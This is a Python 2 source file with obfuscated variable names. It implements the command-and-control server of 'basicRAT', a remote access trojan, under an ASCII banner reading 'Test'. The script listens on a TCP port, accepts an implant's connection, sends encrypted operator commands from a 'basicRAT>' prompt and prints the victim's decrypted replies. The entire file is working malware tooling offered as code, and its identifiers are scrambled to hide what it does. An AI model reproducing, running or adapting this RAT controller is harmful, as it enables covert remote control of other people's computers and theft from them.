#!/usr/bin/env python3
# -*- coding: utf-8 -*-
qaodZaFDJmXiKQLAfVSuIfzbxyQGtKId = """
$$$$$$$$\                    $$\
\__$$  __|                   $$ |
   $$ | $$$$$$\   $$$$$$$\ $$$$$$\
   $$ |$$  __$$\ $$  _____|\_$$  _|
   $$ |$$$$$$$$ |\$$$$$$\    $$ |
   $$ |$$   ____| \____$$\   $$ |$$\
   $$ |\$$$$$$$\ $$$$$$$  |  \$$$$  |
   \__| \_______|\_______/    \____/
"""
import socket
import sys
from core.utils import OKFnZpuLIoJofWHZcXejiAyIffiMqHRo
SUTUmESbSfEfXwOSZOBKGrmfYmaPPbDr = '127.0.0.1'
JvsPXgCkNOGEXVcmLbtkabYQplfuWAKR = 2557
def qPyiVhqpvEIRhDcSBgXljxyyZMwhkZxO():
    for lmQZRtUVMFJRPoLJXsorKHiAAThberUk in qaodZaFDJmXiKQLAfVSuIfzbxyQGtKId.split("\n"):
        print lmQZRtUVMFJRPoLJXsorKHiAAThberUk
    ynJIdahRHfboasdliUeJEuvHjDmLBIhj = OKFnZpuLIoJofWHZcXejiAyIffiMqHRo()
    PlrBJcHYEbLKfgUgAnkvPAhjuvGlTJhr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    PlrBJcHYEbLKfgUgAnkvPAhjuvGlTJhr.bind((SUTUmESbSfEfXwOSZOBKGrmfYmaPPbDr, JvsPXgCkNOGEXVcmLbtkabYQplfuWAKR))
    PlrBJcHYEbLKfgUgAnkvPAhjuvGlTJhr.listen(10)
    print ('[+] basicRAT server listening on port {}...'.format(JvsPXgCkNOGEXVcmLbtkabYQplfuWAKR))
    conn, QzsYJOTmmjNzwTNyXRBPMiWUOGnaapOp = PlrBJcHYEbLKfgUgAnkvPAhjuvGlTJhr.accept()
    while True:
        PyVOlfEMMhmVJGmUPcMafqRwkiHMuUKc = raw_input("basicRAT> ").rstrip()
        if PyVOlfEMMhmVJGmUPcMafqRwkiHMuUKc == '':
            continue
        conn.send(ynJIdahRHfboasdliUeJEuvHjDmLBIhj.QIbNCccGvAWtRaFqgTqWYlOcWbLYpDqe(PyVOlfEMMhmVJGmUPcMafqRwkiHMuUKc))
        if PyVOlfEMMhmVJGmUPcMafqRwkiHMuUKc == 'quit':
            PlrBJcHYEbLKfgUgAnkvPAhjuvGlTJhr.close()
            sys.exit(0)
        NSZDPZedkubjuLmriUxxmkqkciCJEMpV = conn.recv(4096)
        print ynJIdahRHfboasdliUeJEuvHjDmLBIhj.VGpMXRNguhNpETvZqAUNXQRSdFqIHikk(NSZDPZedkubjuLmriUxxmkqkciCJEMpV)
if __name__ == '__main__':
    try:
        qPyiVhqpvEIRhDcSBgXljxyyZMwhkZxO()
    except KeyboardInterrupt as TNwxOcmmIhNNSTAdUrOPvakVvVkGeRCj:
        print("[!] Exit program...")
